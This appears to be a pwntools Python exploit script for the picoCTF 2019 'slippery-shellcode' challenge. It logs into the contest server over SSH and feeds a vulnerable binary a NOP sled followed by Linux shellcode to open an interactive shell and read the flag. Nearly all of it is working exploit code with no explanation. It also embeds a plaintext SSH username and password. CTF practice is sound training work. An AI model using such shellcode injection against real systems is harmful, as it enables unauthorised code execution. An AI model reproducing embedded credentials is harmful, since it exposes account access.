from pwn import *

# Config
LOCAL = False
WRITE = False

# Setup
context.log_level = 'debug'
prob_dir = '/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/'
exe = 'vuln'
if LOCAL:
    sh = process('./' + exe)
else:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')
    sh = s.process(prob_dir + exe, cwd=prob_dir)

# Build exploit
cmd = b'\x90' * 256   # NOP Sled
cmd += asm(shellcraft.i386.linux.sh())

# Write exploit to file
if WRITE:
    f = open('input.txt', 'wb')
    f.write(cmd)
    f.close()

# Buffer overflow
sh.sendlineafter('\n', cmd)
sh.interactive()  # cat flag.txt
